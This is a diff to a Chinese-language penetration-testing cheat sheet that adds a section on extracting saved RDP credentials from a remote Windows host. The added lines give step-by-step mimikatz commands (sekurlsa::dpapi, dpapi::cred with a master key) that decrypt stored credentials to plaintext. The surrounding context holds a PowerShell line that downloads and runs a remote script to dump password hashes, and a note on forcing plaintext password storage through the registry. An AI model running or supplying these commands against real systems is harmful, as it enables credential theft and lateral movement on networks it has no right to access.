@@ -65,6 +65,21 @@ v2.2 https://raw.githubusercontent.com/Mr-xn/Penetration_Testing_POC/master/tool
 
 powershell IEX (New-Object Net.WebClient).DownloadString('https://127.0.0.1/f');Get-PassHashes // 不好使
 
+### 获取远程登录凭据
+
+[内网渗透 | 获取远程主机保存的 RDP 凭据密码](https://mp.weixin.qq.com/s/F4AjedMpzObUm7NH3484lw)
+
+```bash
+# 1.cmdkey /list务必在Session会话下执行 或 poiwerpick
+cmdkey /list
+# 2.导出凭据
+mimikatz.exe "log log_dpapi.txt" "privilege::debug" "sekurlsa::dpapi" "exit"
+# 3.导出SESSION信息
+mimikatz.exe "log 54461880A4E364919FB23518091F65E1.txt" "privilege::debug" "dpapi::cred /in:%userprofile%\AppData\Local\Microsoft\Credentials\54461880A4E364919FB23518091F65E1" "exit"
+# 4.在log_dpapi.txt找到 54461880A4E364919FB23518091F65E1.txt中的guidMasterKey的值下面的masterKey, 读取明文
+mimikatz "log plain1.txt" "dpapi::cred /in:%cred%\54461880A4E364919FB23518091F65E1 /masterkey:0ea407f34e8dbea06a9ce6ee42c61579bdfea6dd3e93d5b9aa36561c223922fe67a2bf18e5350e139bc977d88574cd1b4762c1183647b80e817c0327314cd29a" "exit"
+```
+
 ### windows server 2012 及以上的系统明文
 
 通过添加注册表，再通过例如锁屏、注销或重启等操作，让管理员重新登录及可以读取明文。
